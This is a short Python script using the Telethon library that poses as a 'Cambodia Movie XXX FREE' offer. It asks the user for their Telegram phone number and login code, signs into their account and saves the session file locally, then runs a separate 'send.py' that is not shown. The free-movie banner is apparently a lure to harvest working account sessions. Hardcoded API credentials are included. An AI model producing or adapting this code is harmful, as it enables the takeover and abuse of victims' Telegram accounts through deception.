from telethon import TelegramClient, sync
import os
api_id = 8696891
api_hash = 'ee70f157b8efa547ca29b7d9538d234b'
os.system('clear')
print('\n            == Cambodia Movie XXX FREE == ')
phone = input('\n=> Your TeleGram Number : ')
client = TelegramClient("phone/"+phone, api_id, api_hash)
client.connect()
if not client.is_user_authorized():
    client.send_code_request(phone)
    me = client.sign_in(phone, input('Enter code: '))
os.system('python send.py')
